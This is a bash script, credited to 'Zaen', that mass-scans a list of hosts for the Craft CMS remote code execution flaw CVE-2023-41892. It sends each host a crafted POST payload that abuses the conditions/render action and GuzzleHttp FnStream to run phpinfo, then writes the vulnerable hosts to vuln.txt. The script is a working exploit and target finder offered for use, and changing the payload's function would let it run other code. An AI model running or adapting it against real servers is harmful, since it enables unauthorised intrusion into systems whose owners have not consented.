#!/bin/bash
# ref:
# https://github.com/advisories/GHSA-4w8r-3xrw-v25g
# https://securityonline.info/craft-cms-fixes-rce-cve-2023-41892-flaw-rated-10-out-of-10-on-severity-scale/
# https://blog.calif.io/p/craftcms-rce
merah='\033[0;31m'
hijau='\033[0;32m'
cyan='\033[0;36m'
reset='\033[0m' 
echo -e "${hijau}"
echo "   _______    ________    ___  ____ ___  _____       __ __  _______ ____ ___ "
echo "  / ____/ |  / / ____/   |__ \/ __ \__ \|__  /      / // /<  ( __ )/ __ \__ \\"
echo " / /    | | / / __/________/ / / / /_/ / /_ <______/ // /_/ / __  / /_/ /_/ /"
echo "/ /___  | |/ / /__/_____/ __/ /_/ / __/___/ /_____/__  __/ / /_/ /\__, / __/ "
echo "\____/  |___/_____/    /____|____/____/____/        /_/ /_/\____//____/____/ "
echo -e "${cyan} Written by Zaen${reset}                                            [${hijau} Craft CMS RCE${reset}]"
echo
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 file.txt"
    exit 1
fi
input_file="$1"
vuln=()
while IFS= read -r host
do
    response=$(curl -sk "http://$host/index.php" -X POST -d 'action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()":[{"close":null}],"_fn_close":"phpinfo"}}')
    if echo "$response" | grep -q 'PHP Credits\|PHP Group'; then
        echo -e "[${hijau}+${reset}] $host => ${hijau}VULN${reset}"
        echo "$host" >> "vuln.txt"  
    else
        echo -e "[${merah}-${reset}] $host => ${merah}NOT VULN${reset}"
    fi
done < "$input_file"
if [ -s "vuln.txt" ]; then
    echo "output saved to: vuln.txt"
else
    echo "No vuln hosts found"
fi
